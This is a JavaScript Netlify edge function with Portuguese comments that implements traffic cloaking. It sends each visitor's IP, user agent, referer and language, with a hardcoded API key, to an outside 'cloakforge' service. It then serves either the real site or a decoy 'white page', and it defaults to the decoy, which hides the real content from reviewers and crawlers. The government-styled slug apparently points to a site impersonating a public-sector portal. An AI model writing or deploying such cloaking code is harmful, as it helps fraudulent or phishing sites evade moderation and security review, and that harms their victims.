export default async function handler(request, context) {
  const CLOAK_SLUG = "gov2-servidor-a6283a";
  const CLOAK_KEY  = "7C6JNmtyC2G3rrcRmuADhjF1Nhw54XNq";

  // Ignora assets, funcoes netlify e API routes
  const url = new URL(request.url);
  const path = url.pathname;
  if (
    path.startsWith("/.netlify/") ||
    path.startsWith("/api/") ||
    path.startsWith("/assets/") ||
    path.startsWith("/fonts/") ||
    path.startsWith("/img/") ||
    path.startsWith("/cdn.") ||
    path.endsWith(".js") ||
    path.endsWith(".css") ||
    path.endsWith(".png") ||
    path.endsWith(".jpg") ||
    path.endsWith(".ico") ||
    path.endsWith(".woff2") ||
    path.endsWith(".svg") ||
    path === "/white" ||
    path === "/white.html"
  ) {
    return context.next();
  }

  // Pega IP real do visitante
  const ip  = request.headers.get("cf-connecting-ip")
            || request.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
            || context.ip
            || "0.0.0.0";

  const ua   = request.headers.get("user-agent")       || "";
  const ref  = request.headers.get("referer")           || "";
  const lang = request.headers.get("accept-language")   || "";

  let action   = "block";
  let whiteUrl = null;

  try {
    const params = new URLSearchParams({
      slug: CLOAK_SLUG,
      key:  CLOAK_KEY,
      ip,
      ua,
      url:  request.url,
      ref,
      lang,
    });

    const resp = await fetch(
      `https://cloakforge.app.br/api/cloak/decide?${params}`,
      { signal: AbortSignal.timeout(3000) }
    );

    if (resp.ok) {
      const data = await resp.json();
      action   = data.action || "block";
      whiteUrl = data.url    || null;
    }
  } catch (_) {
    // Fail-safe: trata como block
    action = "block";
  }

  if (action === "allow") {
    return context.next();
  }

  // Visitante bloqueado — mostra white page via fetch server-side
  if (whiteUrl) {
    try {
      const whiteResp = await fetch(whiteUrl, { signal: AbortSignal.timeout(5000) });
      if (whiteResp.ok) {
        const html = await whiteResp.text();
        return new Response(html, {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
        });
      }
    } catch (_) {}
  }

  // Fallback: white page local
  return Response.redirect(new URL("/white.html", request.url), 302);
}

export const config = {
  path: "/*",
};
